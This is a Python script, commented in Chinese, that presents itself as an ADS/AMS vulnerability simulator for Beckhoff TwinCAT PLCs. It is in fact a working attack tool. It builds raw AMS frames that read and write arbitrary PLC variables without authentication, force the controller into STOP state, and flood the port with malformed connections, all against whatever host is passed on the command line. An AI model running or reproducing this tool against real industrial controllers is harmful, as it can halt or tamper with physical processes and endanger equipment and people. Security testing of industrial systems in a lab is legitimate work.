"""
工控漏洞模拟器 - ADS (Automation Device Specification)
====================================================
基于真实 AMS/ADS 协议的安全漏洞模拟。

漏洞类型：
1. 未授权访问 — ADS 默认无认证机制
2. PLC 变量任意读写 — 直接通过 ADS Read/Write 访问
3. PLC 状态篡改 — 通过 WriteControl 切换运行模式
4. 拒绝服务 — 畸形 AMS 帧
"""

import socket
import struct
import random
from enum import Enum
from typing import Optional, List, Dict, Any
from logging import getLogger

logger = getLogger(__name__)

ADS_TCP_PORT = 48898
AMS_HEADER_LEN = 32

# AMS/TCP 帧前缀
AMS_TCP_RESERVED = b'\x00\x00'

# 命令 ID
ADS_CMD_READ_DEVICE_INFO = 1
ADS_CMD_READ = 2
ADS_CMD_WRITE = 3
ADS_CMD_READ_STATE = 4
ADS_CMD_WRITE_CONTROL = 5
ADS_CMD_ADD_NOTIFICATION = 6


class VulnType(Enum):
    UNAUTHORIZED = 'unauthorized_access'
    VAR_READ = 'variable_read'
    VAR_WRITE = 'variable_write'
    STATE_TAMPER = 'state_tamper'
    DOS = 'denial_of_service'


def format_net_id(net_id: str) -> bytes:
    parts = [int(x) for x in net_id.split('.')]
    while len(parts) < 6:
        parts.append(1)
    return bytes(parts[:6])


def build_ams_header(target_net: str, target_port: int,
                     source_net: str, source_port: int,
                     cmd_id: int, payload_len: int,
                     invoke_id: int) -> bytes:
    """构建 32 字节 AMS 头部"""
    return (format_net_id(target_net) + struct.pack('!H', target_port) +
            format_net_id(source_net) + struct.pack('!H', source_port) +
            struct.pack('!HHII', cmd_id, 0x0001, payload_len, 0, invoke_id))


def build_ams_tcp_frame(target_net: str, target_port: int,
                        source_net: str, source_port: int,
                        cmd_id: int, payload: bytes = b'',
                        invoke_id: int = 1) -> bytes:
    """构造 AMS/TCP 帧"""
    header = build_ams_header(target_net, target_port, source_net,
                              source_port, cmd_id, len(payload), invoke_id)
    ams_len = AMS_HEADER_LEN + len(payload)
    return AMS_TCP_RESERVED + struct.pack('!I', ams_len) + header + payload


class ADSVulnSimulator:
    """ADS 漏洞模拟器"""

    VULN_INFO = {
        VulnType.UNAUTHORIZED: {
            'name': 'ADS 未授权访问',
            'cve': 'N/A',
            'severity': 'CRITICAL',
            'desc': 'ADS 协议默认无认证机制，任何客户端无需凭证即可连接并操作 PLC。',
        },
        VulnType.VAR_READ: {
            'name': 'PLC 变量任意读取',
            'cve': 'N/A',
            'severity': 'HIGH',
            'desc': '通过 ADS Read 命令可远程读取 TwinCAT PLC 任意地址的变量值。',
        },
        VulnType.VAR_WRITE: {
            'name': 'PLC 变量任意写入',
            'cve': 'N/A',
            'severity': 'CRITICAL',
            'desc': '通过 ADS Write 命令可远程修改 PLC 变量值，篡改控制逻辑。',
        },
        VulnType.STATE_TAMPER: {
            'name': 'PLC 状态篡改',
            'cve': 'N/A',
            'severity': 'CRITICAL',
            'desc': '通过 ADS WriteControl 可远程将 PLC 切换为 STOP/IDLE 状态。',
        },
        VulnType.DOS: {
            'name': 'ADS 拒绝服务',
            'cve': 'N/A',
            'severity': 'HIGH',
            'desc': '畸形 AMS 帧或大量连接可导致 ADS 服务异常。',
        },
    }

    def __init__(self, target: str = '127.0.0.1', port: int = ADS_TCP_PORT,
                 target_net: str = '192.168.0.1.1.1', target_ams_port: int = 851):
        self.target = target
        self.port = port
        self.target_net = target_net
        self.target_ams_port = target_ams_port
        self.src_net = '10.0.0.99.1.1'
        self.src_port = 30000

    def _send_ams(self, cmd_id: int, payload: bytes = b'') -> Optional[bytes]:
        """发送 AMS 请求并接收响应"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((self.target, self.port))

            invoke = random.randint(1, 100000)
            frame = build_ams_tcp_frame(self.target_net, self.target_ams_port,
                                        self.src_net, self.src_port,
                                        cmd_id, payload, invoke)
            s.sendall(frame)

            # 读取响应
            resp = b''
            while len(resp) < 6:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk

            if len(resp) >= 6:
                ams_len = struct.unpack_from('!I', resp, 2)[0]
                while len(resp) < 6 + ams_len:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    resp += chunk

            s.close()
            return resp
        except (socket.timeout, ConnectionRefusedError, OSError) as e:
            logger.debug(f'ADS 通信失败: {e}')
            return None

    def unauthorized_access(self) -> Dict[str, Any]:
        print('[+] 测试 ADS 未授权访问...')
        resp = self._send_ams(ADS_CMD_READ_DEVICE_INFO)
        if resp and len(resp) >= 38:
            payload = resp[38:]
            if len(payload) >= 20:
                name = payload[8:24].rstrip(b'\x00').decode('utf-8', errors='replace')
                return {'vuln': 'UNAUTHORIZED', 'success': True,
                        'detail': f'无需认证访问: {name}'}
        return {'vuln': 'UNAUTHORIZED', 'success': False, 'detail': '连接失败或拒绝'}

    def variable_read(self, offset: int = 0x1000, length: int = 4) -> Dict[str, Any]:
        print(f'[+] 测试 PLC 变量读取 (offset=0x{offset:04x})...')
        payload = struct.pack('!III', 0x00000080, offset, length)
        resp = self._send_ams(ADS_CMD_READ, payload)
        if resp and len(resp) >= 42:
            val = resp[42:46]
            return {'vuln': 'VAR_READ', 'success': True,
                    'detail': f'读取 offset=0x{offset:04x}: {val.hex()}'}
        return {'vuln': 'VAR_READ', 'success': False, 'detail': '读取失败'}

    def variable_write(self, offset: int = 0x1000, value: bytes = b'\x00\x00\x00\x00') -> Dict[str, Any]:
        print(f'[+] 测试 PLC 变量写入 (offset=0x{offset:04x})...')
        payload = struct.pack('!III', 0x00000080, offset, len(value)) + value
        resp = self._send_ams(ADS_CMD_WRITE, payload)
        success = resp is not None and len(resp) >= 6
        return {'vuln': 'VAR_WRITE', 'success': success,
                'detail': f'写入 offset=0x{offset:04x}: {"成功" if success else "失败"}'}

    def state_tamper(self, target_state: int = 6) -> Dict[str, Any]:
        state_names = {5: 'RUN', 6: 'STOP', 2: 'RESET', 11: 'ERROR'}
        state_name = state_names.get(target_state, f'UNKNOWN({target_state})')
        print(f'[+] 测试 PLC 状态篡改 -> {state_name}...')
        payload = struct.pack('!HH', target_state, 0) + b'\x00' * 4
        resp = self._send_ams(ADS_CMD_WRITE_CONTROL, payload)
        success = resp is not None
        return {'vuln': 'STATE_TAMPER', 'success': success,
                'detail': f'切换 PLC 状态为 {state_name}: {"成功" if success else "失败"}'}

    def dos_attack(self) -> Dict[str, Any]:
        print('[+] 测试 ADS 拒绝服务...')
        count = 0
        for i in range(20):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect((self.target, self.port))
                # 发送畸形帧
                s.sendall(b'\xff' * 200)
                s.close()
                count += 1
            except Exception:
                break
        return {'vuln': 'ADS_DOS', 'success': count > 5,
                'detail': f'发送 {count} 个畸形连接'}


def run_all(target: str = '127.0.0.1') -> List[Dict[str, Any]]:
    """run_all 别名 (与其它协议统一接口)"""
    return run_all_exploits(target)


def run_all_exploits(target: str = '127.0.0.1') -> List[Dict[str, Any]]:
    print(f'{"="*50}')
    print(f'  ADS 漏洞模拟器 — 目标 {target}:{ADS_TCP_PORT}')
    print(f'{"="*50}\n')

    vuln = ADSVulnSimulator(target)
    exploits = [
        ('未授权访问', vuln.unauthorized_access),
        ('变量读取', lambda: vuln.variable_read(0x1000)),
        ('变量写入', lambda: vuln.variable_write(0x1000)),
        ('状态篡改', lambda: vuln.state_tamper(6)),
        ('拒绝服务', vuln.dos_attack),
    ]

    results = []
    for name, fn in exploits:
        print(f'--- [{name}] ---')
        r = fn()
        results.append(r)
        icon = '✓' if r.get('success') else '✗'
        print(f'   [{icon}] {r.get("detail", "")}\n')

    ok = sum(1 for r in results if r.get('success'))
    print(f'完成: {ok}/{len(results)} 个漏洞存在')
    return results


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='ADS 漏洞模拟器')
    parser.add_argument('--target', default='127.0.0.1')
    args = parser.parse_args()
    run_all_exploits(args.target)
